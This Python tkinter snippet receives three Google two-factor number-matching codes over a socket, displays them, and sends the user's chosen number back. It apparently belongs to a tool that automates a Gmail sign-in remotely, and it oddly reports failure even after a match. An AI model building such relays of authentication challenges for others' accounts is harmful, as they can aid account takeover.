from tkinter import messagebox
from tkinter.ttk import *;
from tkinter import *;

def G_two_factor(res,mylabel,client):
    def checkNumber(number):
        chk = False
        #input number include your choice authentication number
        for num in codes:
            if(num == number):
                client.send(num.encode())
                chk = True
                break
        #if number is not matched with your choice authentication number
        if(chk == False):
            messagebox.showerror("Number Matching","Your number doesn't include in authentication number")
        else:
            fwindow.destroy()
            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
        
    if(res):
        client.send("okay".encode())
        # get google authentication 3 number from you
        codes = client.recv(1024).decode().split(",")
        fwindow = Toplevel()
        fwindow.geometry("400x180")
        fwindow.resizable(False,False)
        fwindow.title("Gmail Two Authentication")
        Label(fwindow,text=f'''{codes[0]}      {codes[1]}      {codes[2]}''',font=("Arial",15)).pack(pady=10)
        number = Entry(fwindow,width=8)
        number.focus_set()
        number.pack(pady=8)
        Button(fwindow,text="authenticate",width=15,command=lambda:checkNumber(number.get())).pack(pady=8)
    else:
        #result
        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")